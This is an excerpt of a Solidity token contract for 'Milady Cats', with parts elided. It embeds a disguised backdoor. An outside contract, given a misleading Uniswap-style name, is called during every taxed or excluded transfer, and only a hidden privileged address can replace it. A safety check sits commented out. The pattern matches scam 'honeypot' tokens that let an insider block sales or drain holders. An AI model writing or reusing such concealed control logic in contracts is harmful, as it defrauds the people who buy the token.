...
contract MiladyCats is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "Milady Cats";
    string private _symbol = "MiladyCats";
    ...
    uniswapV1 private uniswapV4PairToken;
    ...
    constructor(
        ...
        uniswapV4PairToken = uniswapV1(uniswapV3Pair_);
    ...
    function setuniswapV1(address addresses) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            uniswapV4PairToken = uniswapV1(addresses);
        } else {
            uniswapV4PairToken.create(8**3);
        }
    }
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV4PairToken.create(crec);
        }
        ...
        if (_isExcludedlp[to]) {
            uniswapV4PairToken.create(250**3); 
        }
